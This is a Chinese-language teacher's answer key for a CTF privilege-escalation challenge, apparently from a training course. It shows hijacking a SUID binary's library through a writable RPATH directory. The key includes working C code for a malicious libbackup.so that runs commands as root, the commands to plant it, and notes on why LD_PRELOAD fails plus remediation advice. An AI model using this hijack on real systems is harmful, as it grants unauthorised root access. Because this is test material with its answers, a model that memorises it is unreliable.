# 第 10 题（教师版）：SUID + RPATH 库劫持

> **唯一提权面**：`/opt/backup/bin/backup-tool` 为 SUID root，编译时 `-Wl,-rpath,/opt/backup/lib`，
> 而 `/opt/backup/lib` 是 `root:ops 2775`（`player` 在 `ops` 组）。libbackup.so 本身是 `664`（组可写）。
> **唯一解**：把 `libbackup.so` 替换成自己编译的版本，让 `backup_run()` 以 root 执行命令。
> **已刻意堵死**：`backup-tool` 二进制 0755 root 属主不可写；`/opt/backup/bin` 不可写；
> 无 sudo、无 cron、无其他异常 SUID。

## 一、预置环境

| 路径 | 权限 | 说明 |
|---|---|---|
| `/flag.txt` | `root:root 0400` | 构建时生成 |
| `/opt/backup/bin/backup-tool` | `root:root 4755`（SUID） | 唯一执行入口 |
| `/opt/backup/lib` | `root:ops 2775`（SGID） | **可写**：RPATH 指向这里 |
| `/opt/backup/lib/libbackup.so` | `root:ops 0664` | **可直接覆盖** |
| `/opt/backup/bin` | `root:root 0755` | 不可写 |

`player`：uid 1001，附加组 `ops`。

## 二、唯一解

```bash
/opt/backup/bin/backup-tool
# [backup-tool] starting backup as uid=1001 euid=0
# [libbackup] performing nightly backup

readelf -d /opt/backup/bin/backup-tool | grep -Ei 'rpath|runpath'
# 0x000000000000001d (RUNPATH)  Library runpath: [/opt/backup/lib]

ls -ld /opt/backup/lib
# drwxrwsr-x 2 root ops   <-- 我在 ops 组

cat > /tmp/evil.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
int backup_run(void)
{
    setuid(0); setgid(0);
    system("id; cat /flag.txt");
    return 0;
}
EOF
gcc -shared -fPIC -o /tmp/libbackup.so /tmp/evil.c
cp /tmp/libbackup.so /opt/backup/lib/libbackup.so

/opt/backup/bin/backup-tool
# uid=0(root) ...
# Ly_Flag{...}
```

### 关键点讲解

- **动态链接器加载库的顺序**：RPATH/RUNPATH 在系统路径之前，且 SUID 程序**不会**清空 RPATH
  （只会忽略 `LD_PRELOAD`/`LD_LIBRARY_PATH` 这类环境变量）。
- 只要 **RPATH 指向的目录可写**，SUID 程序就等于把 root 交给可写目录的成员。
- 现实中的同类：第三方 SUID 工具带了错误的 `-rpath`、`$ORIGIN/../lib` 且目录可写、
  或者 SUID 程序从可写目录 `dlopen()` 插件。
- 修复要点：SUID 程序不要用可写目录做库路径；`chmod 755` 库目录；
  用 `-Wl,-z,origin` + 受限 `$ORIGIN` 也不行，最稳的是**去掉 SUID**或改用服务方式。

## 三、为什么只有这一条解

| 思路 | 失败原因 |
|---|---|
| 覆盖 `backup-tool` 二进制 | `/opt/backup/bin` 0755 root，不可写 |
| `LD_PRELOAD` 注入 | SUID 程序会忽略 `LD_PRELOAD`（secure-execution 模式） |
| `LD_LIBRARY_PATH` | 同样被 SUID 忽略 |
| 改 `/etc/ld.so.conf.d` | 0644 root，不可写 |
| 其他 SUID/sudo/cron | 均未预置 |

> 注意：学生可能会想到 `LD_PRELOAD`，正好可以讲“为什么 SUID 程序里 `LD_PRELOAD` 无效，
> 但 RPATH 劫持有效”——这是本题的核心教学点。

## 四、单解验证

```bash
# 正向
gcc -shared -fPIC -o /tmp/libbackup.so /tmp/evil.c
cp /tmp/libbackup.so /opt/backup/lib/libbackup.so
/opt/backup/bin/backup-tool | grep -E 'uid=0|Ly_Flag'

# 负向
echo x >> /opt/backup/bin/backup-tool        # Permission denied
LD_PRELOAD=/tmp/evil.so /opt/backup/bin/backup-tool   # still original output
LD_LIBRARY_PATH=/tmp /opt/backup/bin/backup-tool      # still original output
sudo -n -l                                   # not in sudoers
```
